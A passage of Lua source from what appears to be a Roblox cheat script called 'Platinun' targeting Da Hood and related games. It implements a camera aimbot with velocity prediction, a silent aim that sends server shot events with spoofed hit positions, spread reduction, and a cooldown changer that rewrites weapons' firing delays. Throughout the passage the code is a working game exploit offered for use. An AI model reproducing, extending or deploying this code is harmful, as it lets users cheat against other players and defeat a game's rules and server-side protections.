        elseif velocityMagnitude < 20 then return 0.1
        else return 0.2 end
    end
    local function GetResolvedVelocity(Part)
        local LastPosition = Part.Position
        task.wait(0.085)
        local CurrentPosition = Part.Position
        local Velocity = (CurrentPosition - LastPosition) / 0.085
        local velocityMagnitude = Velocity.Magnitude
        local dynamicSmoothing = getDynamicSmoothingFactor(velocityMagnitude)
        smoothedVelocity = smoothedVelocity * (1 - dynamicSmoothing) + Velocity * dynamicSmoothing
        return smoothedVelocity * Vector3.new(1, 0, 1)
    end
    function Script:GetHitPosition(Mode)
        if Mode == 'Assist' then
            local PlatinunCfg = getgenv()['Platinun']['Camera Aimbot']
            local Object = Script.Locals.AimAssistTarget.Character
            if not Object then return end
            local Humanoid = Object:FindFirstChild("Humanoid"); if not Humanoid then return end
            local NearestPart = Script:GetClosestPartToCursor(Object); if not NearestPart then return end
            local HitPosition
            if PlatinunCfg['Use Custom Parts'] and PlatinunCfg['Use Custom Parts']['Enabled'] then
                local customParts = PlatinunCfg['Use Custom Parts']['Selected Parts'] or {}
                local mode = PlatinunCfg['Use Custom Parts']['Mode'] or "Point"
                if mode == "Point" then
                    local closestPart = Script:GetClosestPartToCursorFilter(Object, customParts)
                    if closestPart then
                        if PlatinunCfg['Closest Point']['Mode'] == 'Smart' then HitPosition = Script:GetClosestPointOnPart(closestPart, PlatinunCfg['Closest Point']['Scale'])
                        else HitPosition = Script:GetClosestPointOnPartBasic(closestPart) end
                    else
                        if PlatinunCfg['Closest Point']['Mode'] == 'Smart' then HitPosition = Script:GetClosestPointOnPart(NearestPart, PlatinunCfg['Closest Point']['Scale'])
                        else HitPosition = Script:GetClosestPointOnPartBasic(NearestPart) end
                    end
                elseif mode == "Part" then
                    local closestPart = nil; local closestDistance = math.huge
                    for _, partName in ipairs(customParts) do
                        local part = Object:FindFirstChild(partName)
                        if part and part:IsA("BasePart") then
                            local pos, onScreen = Camera:WorldToViewportPoint(part.Position)
                            if onScreen then
                                local mousePos = UserInputService:GetMouseLocation()
                                local distance = (Vector2.new(pos.X, pos.Y) - mousePos).Magnitude
                                if distance < closestDistance then closestDistance = distance; closestPart = part end
                            end
                        end
                    end
                    if closestPart then HitPosition = closestPart.Position else HitPosition = NearestPart.Position end
                end
            else
                if PlatinunCfg['Hit Part'] == 'Closest Point' then
                    if PlatinunCfg['Closest Point']['Mode'] == 'Smart' then HitPosition = Script:GetClosestPointOnPart(NearestPart, PlatinunCfg['Closest Point']['Scale'])
                    else HitPosition = Script:GetClosestPointOnPartBasic(NearestPart) end
                elseif PlatinunCfg['Hit Part'] == 'Nearest Part' then HitPosition = NearestPart.Position
                elseif typeof(PlatinunCfg['Hit Part']) == 'table' then
                    local part = Script:GetClosestPartToCursorFilter(Object, PlatinunCfg['Hit Part'])
                    if part then HitPosition = part.Position else HitPosition = NearestPart.Position end
                else
                    local targetPart = Object:FindFirstChild(PlatinunCfg['Hit Part'])
                    if targetPart then HitPosition = targetPart.Position else HitPosition = NearestPart.Position end
                end
            end
            if PlatinunCfg['Prediction']['Enabled'] then
                local BasePrediction = Vector3.new(PlatinunCfg['Prediction']['X'], PlatinunCfg['Prediction']['Y'], PlatinunCfg['Prediction']['Z'])
                HitPosition = HitPosition + Script:GetResolvedVelocity(Object.HumanoidRootPart) * BasePrediction
            end

            return HitPosition
        end
        if Mode == 'Silent' then
            local PlatinunCfg = getgenv()['Platinun']['Silent Aimbot']
            local Object = Script.Locals.SilentAimTarget.Character
            if not Object then return end
            local Humanoid = Object:FindFirstChild("Humanoid"); if not Humanoid then return end
            local NearestPart = Script:GetClosestPartToCursor(Object)
            local HitPosition; local HitPart = PlatinunCfg['Hit Part']
            if HitPart == 'Closest Point' then
                if PlatinunCfg['Closest Point']['Mode'] == 'Smart' then HitPosition = Script:GetClosestPointOnPart(NearestPart, PlatinunCfg['Closest Point']['Scale'])
                else HitPosition = Script:GetClosestPointOnPartBasic(NearestPart) end
            elseif HitPart == 'Nearest Part' then HitPosition = NearestPart.Position
            elseif typeof(HitPart) == 'table' then HitPosition = Script:GetClosestPartToCursorFilter(Object, HitPart).Position
            else HitPosition = Object[HitPart].Position end

            local Tool = Self.Character and Self.Character:FindFirstChildWhichIsA('Tool')

            return HitPosition
        end
    end
    -- UpdateBox is defined later with full core FOV (ScreenGui Circle/Box + 3D part)
    function Script:UpdateLabels() end
    function Script:ShouldShoot(Target)
        if not Target then SilentAimPart.Position = Vector3.zero; return false end
        if not Target.Character then SilentAimPart.Position = Vector3.zero; return false end
        local allConditionsPassed = true
        local Conditions = getgenv()['Platinun']['General']['Conditions']['Silent Aimbot']
        if Conditions['Visible'] then
            if not Script:RayCast(Target.Character.HumanoidRootPart, Script:GetOrigin('Camera'), {Self.Character, SilentAimPart, TriggerPart}) then
                allConditionsPassed = false; SilentAimPart.Position = Vector3.zero
            end
        end
        if Conditions['Knocked'] and CurrentGame.Functions.IsKnocked(Target.Character) then allConditionsPassed = false; SilentAimPart.Position = Vector3.zero end
        if Conditions['Self Knocked'] and CurrentGame.Functions.IsKnocked(Self.Character) then allConditionsPassed = false; SilentAimPart.Position = Vector3.zero end
        if Conditions['Carried'] and CurrentGame.Functions.IsGrabbed(Target) then allConditionsPassed = false; SilentAimPart.Position = Vector3.zero end

        local FOV = getgenv()['Platinun']['Silent Aimbot']['FOV']

        if FOV['Enabled'] and FOV['Mode'] == '3D' then
            local S3 = FOV['3D']

            SilentAimPart.Size = Vector3.new(S3['X'] or 5, S3['Y'] or 7, S3['Z'] or 5)
            SilentAimPart.Parent = workspace
            SilentAimPart.Anchored = true
            SilentAimPart.CanCollide = false
            SilentAimPart.Transparency = FOV['Visible'] and 0.7 or 1
            SilentAimPart.Color = Color3.new(1, 0, 0)

            if allConditionsPassed then
                SilentAimPart.Position = Target.Character.HumanoidRootPart.Position
            else
                SilentAimPart.Position = Vector3.zero
            end

            local mouseLocation = UserInputService:GetMouseLocation()
            local ray = Camera:ViewportPointToRay(mouseLocation.X, mouseLocation.Y)
            local result = raycastSilent(ray.Origin, ray.Direction * 1000)

            if not result or result.Instance ~= SilentAimPart then
                allConditionsPassed = false
                SilentAimPart.Position = Vector3.zero
            end
        elseif FOV['Enabled'] and FOV['Mode'] == '2D' then
            -- 2D: only shoot when mouse is inside the player-centered FOV box
            if not Script.Locals.IsBoxFocused then
                allConditionsPassed = false
                SilentAimPart.Position = Vector3.zero
            end
        elseif FOV['Enabled'] and FOV['Mode'] == 'Circle' then
            local mouseLoc = UserInputService:GetMouseLocation()
            local checkPos = Script.Locals.HitPosition
            if typeof(checkPos) ~= 'Vector3' or checkPos.Magnitude == 0 then
                local hrp = Target.Character:FindFirstChild('HumanoidRootPart')
                if hrp then checkPos = hrp.Position else
                    SilentAimPart.Position = Vector3.zero
                    return false
                end
            end

            local screen = Camera:WorldToViewportPoint(checkPos)
            if not screen or screen.Z <= 0 then
                allConditionsPassed = false
            else
                local DistanceX = math.abs(screen.X - mouseLoc.X)
                local DistanceY = math.abs(screen.Y - mouseLoc.Y)
                local radius = CurrentFOV or FOV['Circle'] or 120
                local dist = math.sqrt(DistanceX * DistanceX + DistanceY * DistanceY)
                if dist > radius then
                    allConditionsPassed = false
                end
            end

            if not allConditionsPassed then
                SilentAimPart.Position = Vector3.zero
            end
        end

        return allConditionsPassed
    end
    local Ticks = {}
    function Script:GetGunCategory()
        if Self and Self.Character then
            local Tool = Self.Character:FindFirstChildWhichIsA("Tool")
            if Tool then
                if table.find(WeaponInfo.Shotguns, Tool.Name) then return "Shotgun" end
                if table.find(WeaponInfo.Pistols, Tool.Name) then return "Pistol" end
                if table.find(WeaponInfo.Rifles, Tool.Name) then return "Rifle" end
                if table.find(WeaponInfo.Bursts, Tool.Name) then return "Burst" end
                if table.find(WeaponInfo.SMG, Tool.Name) then return "SMG" end
                if table.find(WeaponInfo.Snipers, Tool.Name) then return "Sniper" end
                if table.find(WeaponInfo.AutoShotguns, Tool.Name) then return "Auto" end
            end
        end
        return nil
    end
    function Script:SilentAimFunc(Tool)
        if (string.find(GameName, "Dee Hood") or string.find(GameName, "Der Hood")) and getgenv()['Platinun']['Silent Aimbot']['Enabled'] then
            if Script.Locals.SilentAimTarget and Script.Locals.SilentAimTarget.Character then
                local Player = Script.Locals.SilentAimTarget
                local Character = Player.Character
                local Position, OnScreen = Camera:WorldToViewportPoint(Script.Locals.HitPosition)
                if not OnScreen then return end
                if Script:ShouldShoot(Script.Locals.SilentAimTarget) then
                    CurrentGame.RemotePath():FireServer(CurrentGame.Updater, Script.Locals.HitPosition)
                else SilentAimPart.Position = Vector3.zero end
            end
        else
            if string.find(GameName, "Da Hood") then
                if not Ticks[Tool.Name] then Ticks[Tool.Name] = 0 end
                local WeaponOffset = WeaponInfo.Offsets[Tool.Name]
                local Gun = Script:GetGunCategory()
                local ToolHandle = Tool:WaitForChild("Handle")
                local LocalCharacter = Self.Character or Self.CharacterAdded:Wait()
                local Cooldown = Tool:WaitForChild("ShootingCooldown").Value
                local NoClueWhatThisIs = game.PlaceId == 88976059384565 and { ["Value"] = 5 } or Tool.Ammo
                local Time = game:FindFirstChild("Workspace"):GetServerTimeNow()
                local Check = tick() - Ticks[Tool.Name] >= Cooldown + WeaponInfo.Delays[Tool.Name]
                local ToolEvent = Tool:WaitForChild("RemoteEvent", 2) or { ["FireServer"] = function(_, _) end }
                local BeamCol = Color3.new(1, 0.545098, 0.14902)
                local function ShootFunc(GunType, SilentAim)
                    if GunType == "Shotgun" then
                        if Check and (NoClueWhatThisIs.Value >= 1 and (not _G.GUN_COMBAT_TOGGLE and DaHood.CanShoot(Self.Character))) then
                            Ticks[Tool.Name] = tick(); ToolEvent:FireServer("Shoot")
                            for _ = 1, 5 do
                                local HitPosition = Script.Locals.HitPosition
                                local SpreadX, SpreadY, SpreadZ
                                if getgenv()['Platinun']['Weapon Modifications']['Spread Modifier']['Enabled'] then
                                    local spreadData = getgenv()['Platinun']['Weapon Modifications']['Spread Modifier'][Tool.Name]
                                    local spreadReduction = spreadData and spreadData['Value'] or 1
                                    local randomizer = getgenv()['Platinun']['Weapon Modifications']['Spread Modifier']['Randomizer']
                                    spreadReduction = math.clamp(spreadReduction, 0, 1)
                                    local spreadFactor = spreadReduction
                                    if randomizer.Enabled then spreadFactor = spreadFactor * (1 - math.random() * randomizer.Value) end
                                    SpreadX = math.random() > 0.5 and math.random() * 0.05 * spreadFactor or -math.random() * 0.05 * spreadFactor
                                    SpreadY = math.random() > 0.5 and math.random() * 0.1 * spreadFactor or -math.random() * 0.1 * spreadFactor
                                    SpreadZ = math.random() > 0.5 and math.random() * 0.05 * spreadFactor or -math.random() * 0.05 * spreadFactor
                                else
                                    SpreadX = math.random() > 0.5 and math.random() * 0.05 or -math.random() * 0.05
                                    SpreadY = math.random() > 0.5 and math.random() * 0.1 or -math.random() * 0.1
                                    SpreadZ = math.random() > 0.5 and math.random() * 0.05 or -math.random() * 0.05
                                end
                                local ForcedOrigin = Tool:FindFirstChild("Default") and (Tool.Default:FindFirstChild("Mesh") and Tool.Default.Mesh:FindFirstChild("Muzzle")) or { ["WorldPosition"] = (ToolHandle.CFrame * WeaponOffset).Position }
                                local TotalSpread = Vector3.new(SpreadX, SpreadY, SpreadZ)
                                local AimPosition
                                local WeaponRange = Tool:FindFirstChild("Range")
                                if SilentAim and (Self.Character.HumanoidRootPart.Position - Script.Locals.SilentAimTarget.Character.HumanoidRootPart.Position).Magnitude < WeaponRange.Value then
                                    AimPosition = ForcedOrigin.WorldPosition + ((HitPosition - ForcedOrigin.WorldPosition).Unit + TotalSpread) * WeaponRange.Value
                                else
                                    AimPosition = ForcedOrigin.WorldPosition + (DaHood.GetAim(ForcedOrigin.WorldPosition) + TotalSpread) * WeaponRange.Value
                                end
                                local Arg0, Arg1, Arg2 = DaHood.ShootGun({
                                    ["Shooter"] = LocalCharacter, ["Handle"] = ToolHandle, ["AimPosition"] = AimPosition,
                                    ["BeamColor"] = BeamCol, ["ForcedOrigin"] = ForcedOrigin.WorldPosition,
                                    ["LegitPosition"] = ForcedOrigin.WorldPosition + (DaHood.GetAim(ForcedOrigin.WorldPosition) + TotalSpread) * WeaponRange.Value,
                                    ["Range"] = WeaponRange.Value
                                })
                                ReplicatedStorage.MainEvent:FireServer("ShootGun", ToolHandle, ForcedOrigin.WorldPosition, Arg0, Arg1, Arg2, Time)
                            end
                            ToolEvent:FireServer()
                        end
                    elseif Gun == "Pistol" then
                        if Check and (NoClueWhatThisIs.Value >= 1 and (not _G.GUN_COMBAT_TOGGLE and DaHood.CanShoot(Self.Character))) then
                            Ticks[Tool.Name] = tick()
                            local HitPosition = Script.Locals.HitPosition
                            ToolEvent:FireServer("Shoot")
                            local AimPosition
                            local ForcedOrigin = Tool:FindFirstChild("Default") and (Tool.Default:FindFirstChild("Mesh") and Tool.Default.Mesh:FindFirstChild("Muzzle")) or { ["WorldPosition"] = (ToolHandle.CFrame * WeaponOffset).Position }
                            local WeaponRange = Tool:WaitForChild("Range")
                            if SilentAim and (Self.Character.HumanoidRootPart.Position - Script.Locals.SilentAimTarget.Character.HumanoidRootPart.Position).Magnitude < WeaponRange.Value then AimPosition = HitPosition
                            else AimPosition = ForcedOrigin.WorldPosition + DaHood.GetAim(ForcedOrigin.WorldPosition) * 200 end
                            local Arg0, Arg1, Arg2 = DaHood.ShootGun({
                                ["Shooter"] = LocalCharacter, ["Handle"] = ToolHandle,
                                ["ForcedOrigin"] = ForcedOrigin.WorldPosition or (ToolHandle.CFrame * WeaponOffset).Position,
                                ["AimPosition"] = AimPosition, ["BeamColor"] = BeamCol,
                                ["LegitPosition"] = ForcedOrigin.WorldPosition + DaHood.GetAim(ForcedOrigin.WorldPosition) * 200,
                                ["Range"] = WeaponRange.Value
                            })
                            ReplicatedStorage.MainEvent:FireServer("ShootGun", ToolHandle, ForcedOrigin.WorldPosition, Arg0, Arg1, Arg2)
                            ToolEvent:FireServer()
                        end
                    elseif Gun == "Auto" then
                        if Check and (not _G.GUN_COMBAT_TOGGLE and DaHood.CanShoot(LocalCharacter)) then
                            Ticks[Tool.Name] = tick(); ToolEvent:FireServer("Shoot")
                            local Flag = true
                            task.spawn(function()
                                while Flag and (Tool.Parent == LocalCharacter and (NoClueWhatThisIs.Value > 0 and DaHood.CanShoot(LocalCharacter))) do
                                    local HitPosition = Script.Locals.HitPosition
                                    local CurrentTime = game:FindFirstChild("Workspace"):GetServerTimeNow()
                                    for _ = 1, 5 do
                                        local SpreadX, SpreadY, SpreadZ
                                        if getgenv()['Platinun']['Weapon Modifications']['Spread Modifier']['Enabled'] then
                                            local spreadData = getgenv()['Platinun']['Weapon Modifications']['Spread Modifier'][Tool.Name]
                                            local spreadReduction = spreadData and spreadData['Value'] or 1
                                            local randomizer = getgenv()['Platinun']['Weapon Modifications']['Spread Modifier']['Randomizer']
                                            spreadReduction = math.clamp(spreadReduction, 0, 1)
                                            local spreadFactor = spreadReduction
                                            if randomizer.Enabled then spreadFactor = spreadFactor * (1 - math.random() * randomizer.Value) end
                                            SpreadX = math.random() > 0.5 and math.random() * 0.05 * spreadFactor or -math.random() * 0.05 * spreadFactor
                                            SpreadY = math.random() > 0.5 and math.random() * 0.1 * spreadFactor or -math.random() * 0.1 * spreadFactor
                                            SpreadZ = math.random() > 0.5 and math.random() * 0.05 * spreadFactor or -math.random() * 0.05 * spreadFactor
                                        else
                                            SpreadX = math.random() > 0.5 and math.random() * 0.05 or -math.random() * 0.05
                                            SpreadY = math.random() > 0.5 and math.random() * 0.1 or -math.random() * 0.1
                                            SpreadZ = math.random() > 0.5 and math.random() * 0.05 or -math.random() * 0.05
                                        end
                                        local ForcedOrigin = Tool:FindFirstChild("Default") and (Tool.Default:FindFirstChild("Mesh") and Tool.Default.Mesh:FindFirstChild("Muzzle")) or { ["WorldPosition"] = (ToolHandle.CFrame * WeaponOffset).Position }
                                        local TotalSpread = Vector3.new(SpreadX, SpreadY, SpreadZ)
                                        local AimPosition
                                        local WeaponRange = Tool:WaitForChild("Range")
                                        if SilentAim and (Self.Character.HumanoidRootPart.Position - Script.Locals.SilentAimTarget.Character.HumanoidRootPart.Position).Magnitude < WeaponRange.Value then
                                            AimPosition = ForcedOrigin.WorldPosition + ((HitPosition - ForcedOrigin.WorldPosition).Unit + TotalSpread) * WeaponRange.Value
                                        else
                                            AimPosition = ForcedOrigin.WorldPosition + (DaHood.GetAim(ForcedOrigin.WorldPosition) + TotalSpread) * WeaponRange.Value
                                        end
                                        local Arg0, Arg1, Arg2 = DaHood.ShootGun({
                                            ["Shooter"] = LocalCharacter, ["Handle"] = ToolHandle, ["AimPosition"] = AimPosition,
                                            ["BeamColor"] = BeamCol, ["ForcedOrigin"] = ForcedOrigin.WorldPosition,
                                            ["LegitPosition"] = ForcedOrigin.WorldPosition + (DaHood.GetAim(ForcedOrigin.WorldPosition) + TotalSpread) * WeaponRange.Value,
                                            ["Range"] = WeaponRange.Value
                                        })
                                        ReplicatedStorage.MainEvent:FireServer("ShootGun", ToolHandle, ForcedOrigin.WorldPosition, Arg0, Arg1, Arg2, CurrentTime)
                                    end
                                    task.wait(Cooldown + 0.0095)
                                    Ticks[Tool.Name] = tick()
                                end
                                ToolEvent:FireServer()
                            end)
                            Tool.Deactivated:Wait()
                            Flag = false
                        end
                    elseif Gun == "Burst" then
                        local Tolerance = Tool:WaitForChild("ToleranceCooldown").Value
                        local ShootingCool = Tool:WaitForChild("ShootingCooldown").Value
                        if tick() - Ticks[Tool.Name] >= Tolerance and (not _G.GUN_COMBAT_TOGGLE and DaHood.CanShoot(LocalCharacter)) then
                            Ticks[Tool.Name] = tick(); ToolEvent:FireServer("Shoot")
                            game:FindFirstChild("Workspace"):GetServerTimeNow()
                            task.spawn(function()
                                for _ = 1, NoClueWhatThisIs.Value > 3 and 3 or NoClueWhatThisIs.Value do
                                    local HitPosition = Script.Locals.HitPosition
                                    local v17
                                    local ForcedOrigin = Tool:FindFirstChild("Default") and (Tool.Default:FindFirstChild("Mesh") and Tool.Default.Mesh:FindFirstChild("Muzzle")) or { ["WorldPosition"] = (ToolHandle.CFrame * WeaponOffset).Position }
                                    local WeaponRange = Tool:WaitForChild("Range")
                                    if SilentAim and (Self.Character.HumanoidRootPart.Position - Script.Locals.SilentAimTarget.Character.HumanoidRootPart.Position).Magnitude < WeaponRange.Value then
                                        v17 = ForcedOrigin.WorldPosition + ((HitPosition - ForcedOrigin.WorldPosition).Unit) * 200
                                    else v17 = ForcedOrigin.WorldPosition + DaHood.GetAim(ForcedOrigin.WorldPosition) * 200 end
                                    local v18, v19, v20 = DaHood.ShootGun({
                                        ["Shooter"] = LocalCharacter, ["Handle"] = ToolHandle,
                                        ["ForcedOrigin"] = ForcedOrigin.WorldPosition, ["AimPosition"] = v17,
                                        ["LegitPosition"] = ForcedOrigin.WorldPosition + DaHood.GetAim(ForcedOrigin.WorldPosition) * 200,
                                        ["BeamColor"] = BeamCol, ["Range"] = WeaponRange.Value
                                    })
                                    ReplicatedStorage.MainEvent:FireServer("ShootGun", ToolHandle, ForcedOrigin.WorldPosition, v18, v19, v20)
                                    task.wait(ShootingCool + 0.0095)
                                end
                                ToolEvent:FireServer()
                            end)
                        end
                    elseif Gun == "Rifle" or GunType == "SMG" then
                        local ShootingCool = Tool:WaitForChild("ShootingCooldown").Value
                        if Check and (not _G.GUN_COMBAT_TOGGLE and DaHood.CanShoot(LocalCharacter)) then
                            Ticks[Tool.Name] = tick(); ToolEvent:FireServer("Shoot")
                            local Flag = true
                            task.spawn(function()
                                while task.wait(ShootingCool + 0.0095) and (Flag and (Tool.Parent == LocalCharacter and (NoClueWhatThisIs.Value > 0 and DaHood.CanShoot(LocalCharacter)))) do
                                    local HitPosition = Script.Locals.HitPosition
                                    local ForcedOrigin = Tool:FindFirstChild("Default") and (Tool.Default:FindFirstChild("Mesh") and Tool.Default.Mesh:FindFirstChild("Muzzle")) or { ["WorldPosition"] = (ToolHandle.CFrame * WeaponOffset).Position }
                                    local AimPosition
                                    local WeaponRange = Tool:WaitForChild("Range")
                                    if SilentAim and (Self.Character.HumanoidRootPart.Position - Script.Locals.SilentAimTarget.Character.HumanoidRootPart.Position).Magnitude < WeaponRange.Value then
                                        AimPosition = ForcedOrigin.WorldPosition + ((HitPosition - ForcedOrigin.WorldPosition).Unit) * 200
                                    else AimPosition = ForcedOrigin.WorldPosition + DaHood.GetAim(ForcedOrigin.WorldPosition) * 200 end
                                    local v18, v19, v20 = DaHood.ShootGun({
                                        ["Shooter"] = LocalCharacter, ["Handle"] = ToolHandle,
                                        ["ForcedOrigin"] = ForcedOrigin.WorldPosition, ["AimPosition"] = AimPosition,
                                        ["LegitPosition"] = ForcedOrigin.WorldPosition + DaHood.GetAim(ForcedOrigin.WorldPosition) * 200,
                                        ["BeamColor"] = BeamCol, ["Range"] = WeaponRange.Value
                                    })
                                    ReplicatedStorage.MainEvent:FireServer("ShootGun", ToolHandle, ForcedOrigin.WorldPosition, v18, v19, v20)
                                    Ticks[Tool.Name] = tick()
                                end
                                ToolEvent:FireServer()
                            end)
                            Tool.Deactivated:Wait()
                            Flag = false
                        end
                    elseif Gun == "Sniper" then
                        if Check and (not _G.GUN_COMBAT_TOGGLE and DaHood.CanShoot(LocalCharacter)) then
                            Ticks[Tool.Name] = tick(); ToolEvent:FireServer("Shoot")
                            local HitPosition = Script.Locals.HitPosition
                            local ForcedOrigin = Tool:FindFirstChild("Default") and (Tool.Default:FindFirstChild("Mesh") and Tool.Default.Mesh:FindFirstChild("Muzzle")) or { ["WorldPosition"] = (ToolHandle.CFrame * WeaponOffset).Position }
                            local AimPosition
                            local WeaponRange = Tool:WaitForChild("Range")
                            if SilentAim and (Self.Character.HumanoidRootPart.Position - Script.Locals.SilentAimTarget.Character.HumanoidRootPart.Position).Magnitude < WeaponRange.Value then
                                AimPosition = ForcedOrigin.WorldPosition + ((HitPosition - ForcedOrigin.WorldPosition).Unit) * 50
                            else AimPosition = ForcedOrigin.WorldPosition + DaHood.GetAim(ForcedOrigin.WorldPosition) * 50 end
                            local v16, v17, v18 = DaHood.ShootGun({
                                ["Shooter"] = LocalCharacter, ["Handle"] = ToolHandle,
                                ["ForcedOrigin"] = ForcedOrigin.WorldPosition, ["AimPosition"] = AimPosition,
                                ["LegitPosition"] = ForcedOrigin.WorldPosition + DaHood.GetAim(ForcedOrigin.WorldPosition) * 50,
                                ["BeamColor"] = BeamCol, ["Range"] = WeaponRange.Value
                            })
                            ReplicatedStorage.MainEvent:FireServer("ShootGun", ToolHandle, ForcedOrigin.WorldPosition, v16, v17, v18)
                            ToolEvent:FireServer()
                        end
                    end
                end
                                local SilentCfg = getgenv()['Platinun']['Silent Aimbot']
                local STarget = Script.Locals.SilentAimTarget

                if SilentCfg['Enabled'] and SilentCfg['Hit Sync'] then
                    -- Hit Sync: only register the shot if a live target + valid hit pos exist
                    local fire = false
                    if STarget and STarget.Character then
                        local TChar = STarget.Character
                        local THRP  = TChar:FindFirstChild('HumanoidRootPart')
                        local THum  = TChar:FindFirstChildOfClass('Humanoid')
                        local HP    = Script.Locals.HitPosition
                        if THRP and THum and THum.Health > 0
                           and typeof(HP) == 'Vector3' and HP.Magnitude > 0 then
                            fire = true
                        end
                    end
                    if fire then
                        ShootFunc(Gun, true)
                    end
                elseif SilentCfg['Enabled'] and STarget and STarget.Character then
                    ShootFunc(Gun, Script:ShouldShoot(STarget))
                else
                    ShootFunc(Gun, false)
                end
            end
        end
    end
    function Script:ApplyGunDelay(tool)
        if not tool or not tool:IsA("Tool") then return end
        local delayCfg = getgenv()['Platinun']['Weapon Modifications']['Delay Changer']
        if not delayCfg or not delayCfg['Enabled'] then return end
        local delay
        local weaponEntry = delayCfg[tool.Name]
        if weaponEntry ~= nil then
            if type(weaponEntry) == "table" and weaponEntry['Value'] ~= nil then delay = weaponEntry['Value']
            elseif type(weaponEntry) == "number" then delay = weaponEntry end
        end
        if delay == nil then
            local othersEntry = delayCfg['Others']
            if type(othersEntry) == "table" and othersEntry['Value'] ~= nil then delay = othersEntry['Value']
            elseif type(othersEntry) == "number" then delay = othersEntry end
        end
        if delay == nil then return end
        local shooting = tool:FindFirstChild("ShootingCooldown"); if shooting and shooting:IsA("ValueBase") then pcall(function() shooting.Value = delay end) end
        local tolerance = tool:FindFirstChild("ToleranceCooldown"); if tolerance and tolerance:IsA("ValueBase") then pcall(function() tolerance.Value = delay end) end
        WeaponInfo.Delays[tool.Name] = delay
    end
    local function SetupDelayForTool(tool)
        if not tool or not tool:IsA("Tool") then return end
        Script:ApplyGunDelay(tool)
        tool.ChildAdded:Connect(function(child)
            if child.Name == "ShootingCooldown" or child.Name == "ToleranceCooldown" then
                task.defer(function() Script:ApplyGunDelay(tool) end)
            end
        end)
    end
    local function WatchSpawnDelays(spawnedChar)
        if not spawnedChar then return end
        for _, v in ipairs(spawnedChar:GetChildren()) do if v:IsA("Tool") then SetupDelayForTool(v) end end
        spawnedChar.ChildAdded:Connect(function(v) if v:IsA("Tool") then SetupDelayForTool(v) end end)
    end
    if Self.Character then WatchSpawnDelays(Self.Character) end
    Self.CharacterAdded:Connect(WatchSpawnDelays)
    for _, v in ipairs(Self.Backpack:GetChildren()) do if v:IsA("Tool") then SetupDelayForTool(v) end end
    Self.Backpack.ChildAdded:Connect(function(v) if v:IsA("Tool") then SetupDelayForTool(v) end end)
    -- was game.DescendantAdded (fires for entire DataModel = lag spikes)
    -- tool ChildAdded handlers above already cover this
    task.spawn(function()
        while true do
            task.wait(1.5)
            local delayCfg = getgenv()['Platinun']['Weapon Modifications']['Delay Changer']
            if not delayCfg or not delayCfg['Enabled'] then continue end
            local function scan(container)
                if not container then return end
                for _, tool in ipairs(container:GetChildren()) do if tool:IsA("Tool") then Script:ApplyGunDelay(tool) end end
            end
            scan(Self.Character); scan(Self.Backpack)
        end
    end)
    function Script:AimAssist()
        local Enabled = getgenv()['Platinun']['Camera Aimbot']['Enabled']
        if not Enabled then return end
        if not Script.Locals.SP2 then return end
        if not Script.Locals.AimAssistTarget or not Script.Locals.AimAssistTarget.Character then return end

        local Cond = getgenv()['Platinun']['General']['Conditions']['Camera Aimbot']
        local Player = Script.Locals.AimAssistTarget
        local Character = Player.Character
        if not Character:FindFirstChild('HumanoidRootPart') then return end

        if Cond['Visible'] then
            if not Script:RayCast(Character.HumanoidRootPart, Script:GetOrigin('Camera'), {Self.Character, SilentAimPart, TriggerPart}) then return end
        end
        if Cond['Knocked'] and CurrentGame.Functions.IsKnocked(Player.Character) then return end
        if Cond['Self Knocked'] and CurrentGame.Functions.IsKnocked(Self.Character) then return end
        if Cond['Carried'] and CurrentGame.Functions.IsGrabbed(Player) then return end

        local PlatinunCfg = getgenv()['Platinun']['Camera Aimbot']
        local CurrentCamera = Workspace.CurrentCamera
        local Hit = Script:GetHitPosition("Assist")
        if not Hit then return end
        do
            local TargetSnappiness = PlatinunCfg['Smoothing']['Value']
            if PlatinunCfg['Smoothing']['Smart Smoothing']['Enabled'] then
                local targetVelocity = Vector3.new(0, 0, 0)
                if Character and Character:FindFirstChild("HumanoidRootPart") then targetVelocity = Character.HumanoidRootPart.Velocity end
                local currentSpeed = targetVelocity.Magnitude
                local minSpeed = PlatinunCfg['Smoothing']['Smart Smoothing']['Speed']['Min']
                local maxSpeed = PlatinunCfg['Smoothing']['Smart Smoothing']['Speed']['Max']
                local minSmooth = PlatinunCfg['Smoothing']['Smart Smoothing']['Min']
                local maxSmooth = PlatinunCfg['Smoothing']['Smart Smoothing']['Max']
                local mode = PlatinunCfg['Smoothing']['Smart Smoothing']['Mode']
                if CurrentSnappiness == nil then CurrentSnappiness = minSmooth end
                local speedFactor = 0
                if currentSpeed <= minSpeed then speedFactor = 0
                elseif currentSpeed >= maxSpeed then speedFactor = 1
                else speedFactor = (currentSpeed - minSpeed) / (maxSpeed - minSpeed) end
                if mode == "Fast" then speedFactor = speedFactor ^ 1.5 else speedFactor = speedFactor ^ 2.0 end
                TargetSnappiness = minSmooth + (maxSmooth - minSmooth) * speedFactor
                TargetSnappiness = math.clamp(TargetSnappiness, minSmooth, maxSmooth)
            end
            if PlatinunCfg['Smoothing']['Smart Smoothing']['Enabled'] then
                if CurrentSnappiness == nil then CurrentSnappiness = PlatinunCfg['Smoothing']['Smart Smoothing']['Min'] end
                local transitionRate = PlatinunCfg['Smoothing']['Smart Smoothing']['Mode'] == "Fast" and 0.25 or 0.08
                CurrentSnappiness = CurrentSnappiness + (TargetSnappiness - CurrentSnappiness) * transitionRate
                if math.abs(TargetSnappiness - CurrentSnappiness) < 0.0005 then CurrentSnappiness = TargetSnappiness end
                local EasedSmoothing = TweenService:GetValue(CurrentSnappiness, Enum.EasingStyle[PlatinunCfg['Smoothing']['Easing Style']], Enum.EasingDirection[PlatinunCfg['Smoothing']['Easing Direction']])
                CurrentCamera.CFrame = CurrentCamera.CFrame:Lerp(CFrame.new(CurrentCamera.CFrame.Position, Hit), EasedSmoothing)
            else
                local EasedSmoothing = TweenService:GetValue(TargetSnappiness, Enum.EasingStyle[PlatinunCfg['Smoothing']['Easing Style']], Enum.EasingDirection[PlatinunCfg['Smoothing']['Easing Direction']])
                CurrentCamera.CFrame = CurrentCamera.CFrame:Lerp(CFrame.new(CurrentCamera.CFrame.Position, Hit), EasedSmoothing)
            end
        end
    end
    local function raycastTrigger(origin, direction, raycastParams)
        local result = workspace:Raycast(origin, direction, raycastParams)
        if result and result.Instance then
            if result.Instance ~= TriggerPart then
                origin = result.Position + direction.Unit * 0.1
                return raycastTrigger(origin, direction, raycastParams)
            else return result end
        end
        return nil
    end
    local triggerRaycastParams = RaycastParams.new()
    triggerRaycastParams.FilterType = Enum.RaycastFilterType.Whitelist
    triggerRaycastParams.FilterDescendantsInstances = {TriggerPart}
